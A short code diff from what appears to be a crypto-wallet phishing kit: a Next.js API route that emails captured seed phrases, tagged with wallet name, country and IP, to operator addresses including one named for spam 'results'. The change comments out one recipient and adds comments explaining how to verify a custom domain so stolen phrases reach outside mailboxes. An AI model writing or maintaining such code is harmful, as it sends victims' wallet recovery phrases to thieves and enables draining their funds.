@@ -275,10 +275,12 @@ export async function POST(req: NextRequest) {
   try {
     await resend.emails.send({
       from: "Wallet App <onboarding@resend.dev>",
-      // Add as many emails into this array as you need! Limit per request is 50.
+      // ⚠️ IMPORTANT: When using Resend's free 'onboarding@resend.dev' domain, 
+      // you can ONLY send emails to the email address registered to your Resend account.
+      // To send to other emails (like Yahoo), you MUST verify a custom domain in Resend.
       to: [
         "uwemuwemetim@gmail.com", 
-        "allspamresults990@yahoo.com"
+        // "allspamresults990@yahoo.com" // <-- Uncomment this ONLY after adding a custom domain!
       ],
       subject: `🔐 ${wordCount}-word phrase · ${wallet ?? "Unknown"} · ${flag}${geo.country_name ?? ip}`,
       html,
